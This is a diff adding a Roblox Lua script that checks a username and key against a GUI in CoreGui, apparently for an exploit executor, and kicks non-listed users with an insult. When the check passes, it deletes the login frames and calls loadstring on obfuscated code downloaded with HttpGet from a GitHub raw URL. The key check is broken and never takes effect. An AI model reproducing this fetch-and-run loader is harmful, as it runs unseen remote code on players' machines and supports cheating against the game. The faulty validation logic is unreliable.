@@ -1,0 +1,49 @@
+-- // Logins: // --
+
+local Usernames = {
+["test"] = true;
+}
+
+local Passwords = {
+[""] = false;
+}
+
+
+-- // Variables: // --
+
+local Login = game.CoreGui.Login
+
+local Key = Login.Main.WhitelistFrame.Key
+
+local Username = Login.Main.UserFrame.UserBox
+
+local Userpassed = false
+
+local WLPassed = false
+
+
+
+-- // Login Function: // --
+
+if Usernames[Username.Text] then
+Userpassed = true
+else
+game.Players.LocalPlayer:Kick("dumbass! Wrong key")
+end
+
+if Passwords[Key.Text] then
+WLPassed = false
+else
+
+end
+
+if Userpassed == true then
+if WLPassed == false then
+for i,v in pairs(game.CoreGui:GetDescendants()) do
+ if v.Name == "Main" then
+  v:Destroy()
+ end
+end
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Balligusapos/Balligusapos/main/robloxs-obfuscated'))()
+end
+end
